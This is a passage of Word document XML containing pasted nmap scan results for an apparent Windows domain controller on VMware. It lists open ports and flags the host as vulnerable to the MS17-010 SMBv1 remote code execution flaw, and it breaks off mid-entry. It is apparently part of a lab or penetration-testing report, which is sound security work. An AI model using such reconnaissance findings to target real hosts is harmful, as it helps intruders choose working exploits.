        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C8C242E" w14:textId="77777777" w:rsidR="007077E7" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>|_http-trace: TRACE is enabled</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1754D626" w14:textId="77777777" w:rsidR="007077E7" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">82/tcp    </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>open  xfer</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="2CA836B0" w14:textId="77777777" w:rsidR="007077E7" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>|_clamav-exec: ERROR: Script execution failed (use -d to debug)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C46D155" w14:textId="77777777" w:rsidR="007077E7" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">88/tcp    </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>open  kerberos</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>-sec</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53D98A16" w14:textId="77777777" w:rsidR="007077E7" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>|_clamav-exec: ERROR: Script execution failed (use -d to debug)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B935086" w14:textId="77777777" w:rsidR="007077E7" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">135/tcp   </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>open  msrpc</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="3D84F90D" w14:textId="77777777" w:rsidR="007077E7" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>|_clamav-exec: ERROR: Script execution failed (use -d to debug)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31532F6E" w14:textId="77777777" w:rsidR="007077E7" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">139/tcp   </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>open  netbios</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>-ssn</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F4F6248" w14:textId="77777777" w:rsidR="007077E7" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>|_clamav-exec: ERROR: Script execution failed (use -d to debug)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="037A3D66" w14:textId="77777777" w:rsidR="007077E7" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">389/tcp   </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>open  ldap</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="03923259" w14:textId="77777777" w:rsidR="007077E7" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>|_clamav-exec: ERROR: Script execution failed (use -d to debug)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AA22DF7" w14:textId="77777777" w:rsidR="007077E7" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">|_sslv2-drown: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5ACA27F5" w14:textId="77777777" w:rsidR="007077E7" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">445/tcp   </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>open  microsoft</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>-ds</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="186BC9EF" w14:textId="77777777" w:rsidR="007077E7" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>|_clamav-exec: ERROR: Script execution failed (use -d to debug)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A2E86D3" w14:textId="77777777" w:rsidR="007077E7" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">464/tcp   </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>open  kpasswd</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>5</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65F744E9" w14:textId="77777777" w:rsidR="007077E7" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>|_clamav-exec: ERROR: Script execution failed (use -d to debug)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A1B8D03" w14:textId="77777777" w:rsidR="007077E7" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">593/tcp   </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>open  http</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>-rpc-epmap</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DFD9B48" w14:textId="77777777" w:rsidR="007077E7" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>|_clamav-exec: ERROR: Script execution failed (use -d to debug)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="353B0847" w14:textId="77777777" w:rsidR="007077E7" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">636/tcp   </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>open  ldapssl</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="34B94DA8" w14:textId="77777777" w:rsidR="007077E7" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>|_clamav-exec: ERROR: Script execution failed (use -d to debug)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43E4F2E8" w14:textId="77777777" w:rsidR="007077E7" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">|_sslv2-drown: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4147960F" w14:textId="77777777" w:rsidR="007077E7" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>3268/</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>tcp  open</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">  globalcatLDAP</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="725486E0" w14:textId="77777777" w:rsidR="007077E7" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>|_clamav-exec: ERROR: Script execution failed (use -d to debug)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FC73FE1" w14:textId="77777777" w:rsidR="007077E7" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>3269/</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>tcp  open</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">  globalcatLDAPssl</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09EA6200" w14:textId="77777777" w:rsidR="007077E7" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>|_clamav-exec: ERROR: Script execution failed (use -d to debug)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FBE4382" w14:textId="77777777" w:rsidR="007077E7" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">|_sslv2-drown: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4130C431" w14:textId="77777777" w:rsidR="007077E7" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">49152/tcp </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>open  unknown</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="06E37049" w14:textId="77777777" w:rsidR="007077E7" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>|_clamav-exec: ERROR: Script execution failed (use -d to debug)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E5743E2" w14:textId="77777777" w:rsidR="007077E7" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">49153/tcp </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>open  unknown</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="54D42B1D" w14:textId="77777777" w:rsidR="007077E7" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>|_clamav-exec: ERROR: Script execution failed (use -d to debug)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A86D498" w14:textId="77777777" w:rsidR="007077E7" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">49154/tcp </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>open  unknown</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="5196BBFC" w14:textId="77777777" w:rsidR="007077E7" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>|_clamav-exec: ERROR: Script execution failed (use -d to debug)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EB69A8D" w14:textId="77777777" w:rsidR="007077E7" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">49155/tcp </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>open  unknown</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="5E53CB31" w14:textId="77777777" w:rsidR="007077E7" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>|_clamav-exec: ERROR: Script execution failed (use -d to debug)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FA70AF0" w14:textId="77777777" w:rsidR="007077E7" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">49157/tcp </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>open  unknown</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="565B87DB" w14:textId="77777777" w:rsidR="007077E7" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>|_clamav-exec: ERROR: Script execution failed (use -d to debug)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1077C144" w14:textId="77777777" w:rsidR="007077E7" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">49158/tcp </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>open  unknown</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="5D3E05F9" w14:textId="77777777" w:rsidR="007077E7" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>|_clamav-exec: ERROR: Script execution failed (use -d to debug)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F780B1B" w14:textId="77777777" w:rsidR="007077E7" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">49163/tcp </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>open  unknown</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="2B4EE8FF" w14:textId="77777777" w:rsidR="007077E7" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>|_clamav-exec: ERROR: Script execution failed (use -d to debug)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D4D3E7B" w14:textId="77777777" w:rsidR="007077E7" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>MAC Address: 00:0</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>C:29:70</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>:FC:E3 (VMware)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67629EDE" w14:textId="77777777" w:rsidR="007077E7" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4D758E9A" w14:textId="77777777" w:rsidR="007077E7" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Host script results:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31EC8FA0" w14:textId="77777777" w:rsidR="007077E7" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>|_smb-vuln-ms10-054: false</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B4EB342" w14:textId="77777777" w:rsidR="007077E7" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="753FC569" w14:textId="77777777" w:rsidR="007077E7" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">| smb-vuln-ms17-010: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A855691" w14:textId="77777777" w:rsidR="007077E7" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>|   VULNERABLE:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5856B13F" w14:textId="77777777" w:rsidR="007077E7" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10DA9D0D" w14:textId="77777777" w:rsidR="007077E7" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>|     State: VULNERABLE</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DC7A310" w14:textId="77777777" w:rsidR="007077E7" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">|     IDs:  </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>CVE:CVE</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>-2017-0143</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5EC75E26" w14:textId="77777777" w:rsidR="007077E7" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>|     Risk factor: HIGH</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2173C0A2" w14:textId="77777777" w:rsidR="007077E7" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>|       A critical remote code execution vulnerability exists in Microsoft SMBv1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70B1BEBF" w14:textId="77777777" w:rsidR="007077E7" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>|        servers (ms17-010).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DEF928E" w14:textId="77777777" w:rsidR="007077E7" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">|           </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AD64474" w14:textId="77777777" w:rsidR="007077E7" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>|     Disclosure date: 2017-03-14</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="290CDB27" w14:textId="77777777" w:rsidR="007077E7" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
